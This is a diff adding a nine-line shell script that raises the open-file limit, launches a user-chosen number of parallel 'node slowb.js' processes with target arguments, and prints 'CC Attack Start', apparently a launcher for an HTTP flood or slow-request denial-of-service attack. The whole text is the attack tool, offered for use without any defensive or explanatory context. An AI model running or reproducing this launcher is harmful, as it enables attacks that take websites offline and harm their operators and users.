@@ -1,0 +1,9 @@
+ulimit -n 999999
+
+
+for i in $(seq $1);
+do
+    node slowb.js $2 $3 $4 $5 &
+done
+echo 'by ywy'
+echo "CC Attack Start "
